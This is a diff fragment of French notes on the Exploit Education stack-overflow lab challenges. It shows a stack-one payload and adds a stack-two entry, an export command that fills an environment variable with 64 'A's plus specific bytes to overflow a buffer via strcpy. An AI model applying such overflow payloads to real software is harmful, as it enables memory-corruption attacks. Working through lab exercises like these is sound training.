@@ -103,4 +103,8 @@ fix: if(sizeof(buffer)>64)local.changeme=0;
 
 print("A"*64 + 'IlYb')
 
+**stack-two**
+Cette fois on overflow dans la stack avec strcpy et une variable d'environnement :
+export ExploitEducation=$(python3 -c 'print("A"*64+"\x0a\x09\x0a\x0d")')
+
 
